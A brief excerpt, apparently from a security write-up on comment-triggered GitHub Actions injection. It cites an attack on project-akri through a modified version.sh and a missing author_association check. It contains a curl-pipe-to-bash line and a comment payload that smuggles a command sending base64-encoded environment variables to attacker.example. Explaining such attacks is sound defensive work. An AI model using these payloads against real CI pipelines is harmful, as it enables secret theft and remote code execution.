...
**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `curl -sSfL https://attacker.example/steal | bash` at the top, then commented `/version minor` to trigger execution. No `author_association` check existed.
...
**Payload comment:**
```
/greet"; curl https://attacker.example/$(env | base64) #
```
